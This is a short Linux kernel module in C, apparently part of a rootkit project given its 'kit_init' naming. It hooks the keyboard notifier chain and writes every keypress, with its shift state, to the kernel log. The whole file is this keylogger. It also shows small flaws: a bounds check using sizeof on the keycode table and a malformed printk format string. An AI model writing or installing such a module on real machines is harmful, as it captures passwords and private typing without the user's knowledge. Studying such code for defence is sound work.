#include <linux/module.h>
#include <linux/init.h>

// Keyboard hook
#include <linux/keyboard.h>
#include <linux/semaphore.h>

#include "private.h"

MODULE_LICENSE("GPL");


int key_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    // we don't know what the code is, so just return
    if(param->value < 0 || param->value >= sizeof(keycode)) {
        return NOTIFY_OK;
    }

    printk(KERN_INFO "%s 0x08%x", keycode[param->value], param->shift);

    return NOTIFY_OK;
}

static struct notifier_block keyboard_nb = {
    .notifier_call = key_hook
};

/* Module Init */
static int kit_init(void) {
    printk(KERN_INFO "Module Init!\n");

    // Mount keyboard hook
    register_keyboard_notifier(&keyboard_nb);
    
    return 0;
}

/* Module Exit */
static void kit_exit(void) {
    printk(KERN_INFO "Module Exit!\n");

    // Unmount keyboard hook
    unregister_keyboard_notifier(&keyboard_nb);
}

module_init(kit_init);
module_exit(kit_exit);